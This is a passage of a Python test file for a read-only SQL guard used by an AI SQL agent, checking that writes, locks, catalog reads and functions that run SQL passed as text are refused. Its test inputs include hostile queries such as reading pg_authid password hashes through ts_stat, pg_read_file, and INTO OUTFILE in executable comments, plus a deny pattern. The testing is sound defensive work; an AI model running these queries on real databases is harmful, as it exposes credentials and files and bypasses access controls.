    # a text the tokenizer can't read is checked whole (an unclosed string), never a crash
    assert g.check_sql_readonly("SELECT 'abc​", "tsql") == invisible
    # in a string or a quoted name it's data
    assert g.check_sql_readonly("SELECT 'a​b' AS [x​y] FROM t", "tsql") is None
    assert g.check_sql_readonly("SELECT nom_été FROM t", "tsql") is None   # a letter is a letter


@pytest.mark.parametrize(("sql", "reason"), [
    ("SELECT p.[open], p.close FROM prices p", None),          # after a '.': a column
    ("SELECT close FROM prices", "a T-SQL reserved word used as a name must be [bracketed]: CLOSE"),
    ("SELECT [close] FROM prices", None),
    ("SELECT a FROM t x EXEC('SELECT 1')",
     "a T-SQL statement keyword outside a string or [name] is not allowed: EXEC"),
])
def test_a_column_named_like_a_keyword_gets_a_retry_not_a_failed_run(sql, reason):
    """Audit pass 2 (code review): stock tables have Open/Close; the batch-word scan failed the
    whole run on `p.close`."""
    assert g.check_sql_readonly(sql, "tsql") == reason


@pytest.mark.parametrize(("sql", "dialect", "hard"), [
    ("SELECT my_fn(a) FROM sys.objects", "tsql", "the database's own tables are not readable: sys"),
    ("SELECT pg_read_file('x') FROM pg_catalog.pg_authid", "postgres",
     "the database's own tables are not readable: pg_catalog"),
    ("SELECT pg_terminate_backend(1) FROM t WITH (TABLOCKX)", "tsql",
     "table hints that take locks are not allowed: TABLOCKX"),
    ("SELECT my_fn(a) FROM t FOR UPDATE", "postgres", "row locks (FOR UPDATE/SHARE) are not allowed"),
    # audit pass 2: a hard function reason after a soft one was hidden by it (the walk kept the
    # first function reason)
    ("SELECT weird(1), dbo.round(x) FROM s", "tsql",
     "a schema-qualified function is not allowed: round"),
    ("SELECT weird(1), pg_advisory_lock(1)", "postgres",
     "a lock, admin, session or random function is not allowed: pg_advisory_lock"),
])
def test_a_hard_refusal_wins_over_a_function_refusal(sql, dialect, hard):
    """5.8b audit (silent-failure hunter): the walk returned the first problem, so a function off
    the list (a soft refusal the SQL agent retries) hid a catalog read or a lock: a second paid
    try, and the attempt left out of the read-only trace."""
    assert g.check_sql_readonly(sql, dialect) == hard


@pytest.mark.parametrize(("sql", "dialect", "reason"), [
    ("SELECT my_fn(1)", "postgres", "function not allowed: my_fn"),        # unknown, as written
    ("SELECT My_Fn(1)", "postgres", "function not allowed: my_fn"),
    ("SELECT NEXT VALUE FOR dbo.seq", "tsql",
     "a lock, admin, session or random function is not allowed: next value for dbo.seq"),
    ("SELECT my_fn(1)", None, "function not allowed: my_fn"),             # no dialect: no names
    ("SELECT my_fn(1)", "duckdb", "function not allowed: my_fn"),         # a dialect without names
    ("SELECT dbo.round(x) FROM t", "tsql", "a schema-qualified function is not allowed: round"),
    ("SELECT public.lower(s) FROM t", "postgres", "a schema-qualified function is not allowed: lower"),
    ("SELECT * FROM t WITH (XLOCK, ROWLOCK)", "tsql",
     "table hints that take locks are not allowed: XLOCK, ROWLOCK"),
    ("SELECT pg_typeof($q$ /**/ (select 1) $q$)", "postgres",             # an allowed name given SQL
     "function given a SQL statement as text: pg_typeof"),
])
def test_each_refusal_names_what_it_refused(sql, dialect, reason):
    """The refusal is the SQL agent's retry prompt and the user's message: its exact words."""
    assert g.check_sql_readonly(sql, dialect) == reason


def test_nothing_that_reads_waits_locks_or_says_who_is_on_the_allow_list():
    """The list is reviewed by hand; this keeps the obvious classes off it whatever is added."""
    import re

    from sqlglot import exp
    risky = re.compile(r"read|file|sleep|lock|seq|next_?val|uuid|rand|user|session|role|version|"
                       r"current(?!_?(date|time|timestamp))|connect|database|schema|catalog|"
                       r"server|host|system|exec|url|http|load|copy|export|import|stage|query",
                       re.I)
    names = [c.__name__ for c in g._SQL_FUNCS]
    assert [n for n in names if risky.search(n) and n not in
            ("CurrentDate", "CurrentTimestamp", "CurrentTime", "CurrentDatetime")] == []
    assert all(issubclass(c, exp.Func) for c in g._SQL_FUNCS)
    named = sorted(n for names_ in g._SQL_NAMES.values() for n in names_ if risky.search(n))
    assert named == []


@pytest.mark.parametrize("sql", [
    "SELECT (ts_stat('SELECT to_tsvector(rolpassword) FROM pg_authid')).word",
    "SELECT ts_rewrite('a'::tsquery, 'SELECT t, s FROM aliases')",
    "SELECT some_future_fn('  with x as (select 1) select * from x')",
    "SELECT f(1, 'TABLE pg_authid')",
    # security review of that fix: a leading comment, a line comment, dollar quoting
    "SELECT f('/* x */ SELECT rolpassword FROM pg_authid')",
    "SELECT f('-- x\nSELECT 1')",
    "SELECT f($q$ /**/ (select 1) $q$)",
    "SELECT table_to_xmlschema('pg_authid', true, false, '')"])
def test_a_function_given_sql_as_text_is_refused(sql):
    """Security review (5.8a audit 2): a function that runs a query passed as text (ts_stat,
    ts_rewrite, query_to_xml) reads past every table rule. Named ones are denied, and the class:
    an unknown function whose text argument is a SQL statement."""
    assert g.check_sql_readonly(sql, "postgres") is not None


def test_sql_that_doesnt_parse_says_the_parsers_first_line():
    import sqlglot
    sql = "SELECT FROM WHERE ("
    try:
        sqlglot.parse(sql, read="postgres")
        first = None
    except sqlglot.errors.ParseError as exc:
        first = str(exc).splitlines()[0]
    assert first and g.check_sql_readonly(sql, "postgres") == f"SQL does not parse: {first}"


def test_the_sql_text_check_is_linear_on_hostile_text():
    """Security review: the first version's comment regex backtracked on '/*/*/*…'."""
    import time
    start = time.monotonic()
    g.check_sql_readonly("SELECT f('" + "/*" * 20_000 + "')", "postgres")
    assert time.monotonic() - start < 2


def test_a_function_given_ordinary_text_is_allowed():
    assert g.check_sql_readonly("SELECT initcap('selection'), to_char(now(), 'YYYY')", "postgres") is None
    # allowed functions given text that isn't a query: a word, nothing, a bracket, a lone quote
    for text_ in ["selection", "", "(", "it''s"]:
        assert g.check_sql_readonly(f"SELECT to_char(d, '{text_}') FROM t", "postgres") is None, text_


def test_sql_as_text_is_read_in_the_connections_dialect():
    """MySQL's `#` starts a comment: the query after it is found only when read as MySQL (an
    allowed name, so only the text check can refuse it)."""
    assert g.check_sql_readonly("SELECT json_unquote('# c\nSELECT 1')", "mysql") is not None
    assert g.check_sql_readonly("SELECT json_unquote('# c')", "mysql") is None


def test_the_catalog_rules_follow_the_dialect_rows():
    assert g.check_sql_readonly("SELECT * FROM pg_catalog.pg_authid", "postgres") == \
        "the database's own tables are not readable: pg_catalog"
    assert g.check_sql_readonly("SELECT table_name FROM information_schema.tables", "postgres") is None
    assert g.check_sql_readonly("SELECT 1 /*!50000 , 2 */", "mysql") == \
        "executable comments and optimizer hints (/*! */, /*+ */) are not allowed"


def test_any_read_carrying_an_executable_comment_or_hint_is_refused():
    """The property behind the corpus rows: whatever read query, wherever /*!, /*M! or /*+
    appears outside a string literal, the guard refuses it (on every dialect: Postgres has no
    such comments, so nothing ordinary is lost)."""
    from hypothesis import given
    from hypothesis import strategies as st
    reads = st.sampled_from(["SELECT 1", "SELECT a FROM t", "SELECT a, b FROM t WHERE c > 1",
                             "SELECT COUNT(*) FROM t GROUP BY a"])
    opener = st.sampled_from(["/*!", "/*!50000", "/*M!", "/*M!100100", "/*+", "/*!  "])
    body = st.sampled_from([" SLEEP(5) ", " INTO OUTFILE '/tmp/x' ", " 1 ", "", " MAX_EXECUTION_TIME(1) "])

    @given(reads, opener, body, st.integers(min_value=0, max_value=40), st.sampled_from(["mysql", "postgres"]))
    def check(read, open_, inner, at, dialect):
        cut = min(at, len(read))
        sql = f"{read[:cut]} {open_}{inner}*/ {read[cut:]}"
        assert g.check_sql_readonly(sql, dialect=dialect), sql
    check()


def test_fanout_check_flags_every_trap_and_no_golden():
    for c in CASES:
        if "golden_sql" not in c:
            continue
        layer = LAYERS[c["domain"]]
        assert g.sql_fanout(c["golden_sql"], layer) is None, c["id"]
        if c["category"] == "fanout":
            assert g.sql_fanout(c["trap_sql"], layer), c["id"]


def test_fanout_allows_line_grain_products_and_flags_summed_header_measures():
    layer = LAYERS["retail"]
    ok = ("SELECT SUM(oi.quantity * (oi.unit_price - p.unit_cost)) FROM shop.order_items oi "
          "JOIN shop.products p ON p.product_id = oi.product_id")
    assert g.sql_fanout(ok, layer) is None
    count_distinct = ("SELECT COUNT(DISTINCT o.order_id) FROM shop.orders o "
                      "JOIN shop.order_items oi ON oi.order_id = o.order_id")
    assert g.sql_fanout(count_distinct, layer) is None
    assert g.sql_fanout(count_distinct.replace("DISTINCT ", ""), layer)


def test_metric_check_is_alias_insensitive():
    layer = LAYERS["retail"]
    metric = layer.metric("net_revenue")
    for c in CASES:
        if c.get("metric"):
            dom = LAYERS[c["domain"]]
            assert g.sql_uses_metric(c["golden_sql"], dom.metric(c["metric"]), dom), c["id"]
    naive = ("SELECT SUM(oi.quantity * oi.unit_price) FROM shop.order_items oi "
             "JOIN shop.orders o ON o.order_id = oi.order_id")
    assert not g.sql_uses_metric(naive, metric, layer)


def test_sqlite_query_only_blocks_a_write_the_guard_never_saw():
    engine = create_engine("sqlite://")
    with engine.begin() as conn:
        conn.exec_driver_sql("CREATE TABLE t (a int)")
        conn.exec_driver_sql("INSERT INTO t VALUES (1)")
    with pytest.raises(Exception, match="readonly|read-only|query_only"):
        run_readonly(engine, "DELETE FROM t")
    assert run_readonly(engine, "SELECT count(*) FROM t").rows == [(1,)]


def test_row_cap_truncates_and_says_so():
    engine = create_engine("sqlite://")
    with engine.begin() as conn:
        conn.exec_driver_sql("CREATE TABLE t (a int)")
        conn.exec_driver_sql("INSERT INTO t VALUES (1), (2), (3)")
    res = run_readonly(engine, "SELECT a FROM t", max_rows=2)
    assert res.rows == [(1,), (2,)] and res.truncated and res.columns == ["a"]


# ── Postgres ───────────────────────────────────────────────────────────────────

@pytest.fixture(scope="module")
def engine():
    from evals import sqlgen
    sqlgen.load(PG_URL)
    return create_engine(PG_URL)


@pg
@pytest.mark.parametrize(("sql", "reason"), [
    # a question reads through a server-side cursor (5.8b hardening: streamed): a cursor holds
    # one query, so these writes are refused there first, each for its own named reason; the
    # read-only transaction stays proven alone by the writes a cursor takes (nextval, FOR UPDATE)
    ("DELETE FROM shop.returns", "CURSOR FOR DELETE"),
    ("WITH d AS (DELETE FROM shop.returns RETURNING 1) SELECT count(*) FROM d",
     "must not contain data-modifying statements"),
    ("SELECT nextval('shop.order_seq')", "read-only transaction"),
    ("SELECT * INTO shop.copy FROM shop.returns", r"SELECT \.\.\. INTO is not allowed"),
])
def test_read_only_transaction_blocks_writes_with_the_guard_bypassed(engine, sql, reason):
    from evals.sqlgen import fingerprint
    before = fingerprint(engine)
    with pytest.raises(Exception, match=reason):
        run_readonly(engine, sql)
    assert fingerprint(engine) == before


@pg
def test_statement_timeout_stops_a_slow_query(engine):
    with pytest.raises(Exception, match="statement timeout"):
        run_readonly(engine, "SELECT pg_sleep(5)", timeout_s=1)


@pg
def test_connection_is_usable_after_a_read_only_query(engine):
    run_readonly(engine, "SELECT 1")
    with engine.connect() as conn:   # the pooled connection must not stay read-only
        assert conn.execute(text("SHOW transaction_read_only")).scalar() == "off"


# Regressions from the Phase 4 k=3 run (sql-20261028T024536Z): the model's own SQL.

def test_fanout_through_a_same_grain_subquery_is_flagged():
    sql = """
    SELECT SUM(oi.quantity * oi.unit_price * (1 - oi.discount_pct)) AS net_line_value,
           SUM(o_fees.shipping_fee) AS total_shipping_fees
    FROM shop.order_items oi
    JOIN shop.orders o ON o.order_id = oi.order_id
    JOIN (SELECT order_id, shipping_fee FROM shop.orders
          WHERE status = 'completed') o_fees ON o_fees.order_id = oi.order_id
    WHERE o.status = 'completed'"""
    assert "orders" in g.sql_fanout(sql, LAYERS["retail"])
    cte = ("WITH c AS (SELECT order_id, shipping_fee FROM shop.orders WHERE status = 'completed') "
           "SELECT SUM(c.shipping_fee) FROM c JOIN shop.order_items oi ON oi.order_id = c.order_id")
    assert g.sql_fanout(cte, LAYERS["retail"])
    grouped = ("SELECT SUM(f.fee) FROM shop.order_items oi JOIN (SELECT order_id, SUM(shipping_fee) "
               "AS fee FROM shop.orders GROUP BY order_id) f ON f.order_id = oi.order_id")
    assert g.sql_fanout(grouped, LAYERS["retail"]) is None   # a grouped subquery has its own grain


def test_metric_with_unqualified_columns_in_a_one_table_scope_counts():
    layer = LAYERS["banking"]
    sql = """
    SELECT a.branch, COALESCE(SUM(f.fees), 0) AS fees
    FROM bank.accounts a
    LEFT JOIN (SELECT account_id, -SUM(amount) FILTER (WHERE category = 'fees') AS fees
               FROM bank.transactions GROUP BY account_id) f ON f.account_id = a.account_id
    GROUP BY a.branch"""
    assert g.sql_uses_metric(sql, layer.metric("fee_income"), layer)
    assert g.sql_fanout(sql, layer) is None


def test_metric_filter_may_add_conditions_but_not_drop_them():
    layer = LAYERS["banking"]
    fees = layer.metric("fee_income")
    base = ("SELECT a.branch, {agg} FROM bank.accounts a LEFT JOIN bank.transactions t "
            "ON t.account_id = a.account_id GROUP BY a.branch")
    extra = "-SUM(t.amount) FILTER (WHERE t.category = 'fees' AND t.posted_date >= DATE '2025-01-01')"
    assert g.sql_uses_metric(base.format(agg=extra), fees, layer)   # sql-20261028T025054Z
    dropped = "-SUM(t.amount) FILTER (WHERE t.posted_date >= DATE '2025-01-01')"
    assert not g.sql_uses_metric(base.format(agg=dropped), fees, layer)
    retail = LAYERS["retail"]
    aov = retail.metric("average_order_value")   # Div of two FILTERs: both checked
    sql = ("SELECT SUM(oi.quantity * oi.unit_price * (1 - oi.discount_pct)) FILTER (WHERE "
           "o.status = 'completed' AND o.channel = 'app') / COUNT(DISTINCT o.order_id) FILTER "
           "(WHERE o.status = 'completed' AND o.channel = 'app') FROM shop.order_items oi "
           "JOIN shop.orders o ON o.order_id = oi.order_id")
    assert g.sql_uses_metric(sql, aov, retail)
    assert not g.sql_uses_metric(sql.replace("o.status = 'completed' AND ", "", 1), aov, retail)


@pg
async def test_queries_leave_no_idle_connections_on_the_users_database(engine):
    from connectors.sql_connector import SQLConnector
    from orchestrator.state import ConnectorConfig, ConnectorType
    conn = SQLConnector(ConnectorConfig(type=ConnectorType.SQL, connection_string=PG_URL))

    def idle():
        with engine.connect() as c:
            return c.execute(text("SELECT count(*) FROM pg_stat_activity WHERE "
                                  "datname = current_database() AND state = 'idle' "
                                  "AND pid <> pg_backend_pid()")).scalar()
    before = idle()
    for _ in range(5):
        await conn.query("SELECT 1")
    assert idle() <= before
